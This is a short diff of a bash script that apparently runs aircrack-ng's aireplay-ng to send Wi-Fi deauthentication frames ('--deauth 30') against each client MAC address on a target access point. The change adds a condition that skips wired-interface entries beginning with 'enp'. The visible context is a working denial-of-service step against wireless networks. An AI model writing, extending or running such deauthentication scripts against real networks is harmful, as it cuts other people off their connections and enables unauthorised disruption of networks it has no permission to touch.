@@ -15,6 +15,8 @@ if [[ $mac = HWaddress ]]; then
 echo "";clear
 elif [[ $mac = "<" ]]; then
 echo "";clear
+elif [[ $mac = enp* ]]; then
+echo "";clear
 else
 sudo aireplay-ng  --deauth 30 -a $MYBSSID -c $mac $wlan0
 fi
